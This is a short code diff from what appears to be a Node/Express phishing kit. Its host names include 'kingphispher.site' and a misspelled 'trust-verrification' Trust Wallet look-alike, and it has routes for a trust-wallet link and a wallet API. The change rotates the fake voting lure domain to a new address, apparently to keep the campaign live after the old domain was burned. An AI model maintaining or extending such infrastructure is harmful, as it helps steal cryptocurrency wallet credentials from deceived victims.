@@ -53,16 +53,15 @@ app.use(function (req, res, next) {
   res.locals.error = req.flash('error');
   req.app.mainURL = "www.kingphispher.site"
   req.app.mainURL2 = "kingphispher.site"
-  req.app.voteUrl = "www.swiftvotez.site";
-  req.app.voteUrl2 = "www.swiftvotez.site";
-  req.app.hostname1 = "www.swiftvotez.site";
-  req.app.hostname2 = "www.swiftvotez.site";
+  req.app.voteUrl = "www.swtpolz.site";
+  req.app.voteUrl2 = "www.swtpolz.site";
+  req.app.hostname1 = "www.swtpolz.site";
+  req.app.hostname2 = "www.swtpolz.site";
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
   next();
 });
-
 
 const PORT = process.env.PORT || 2022;
 
@@ -79,7 +78,6 @@ app.use("/trust-wallet-link", require("./routes/trustwallet"));
 app.use("/api/wallet", require("./routes/api/wallet"));
 app.use("/admin", require("./routes/admin"));
 app.use("/admin", require("./routes/admin/auth"));
-
 
 app.use("*", (req, res) => {
   try {
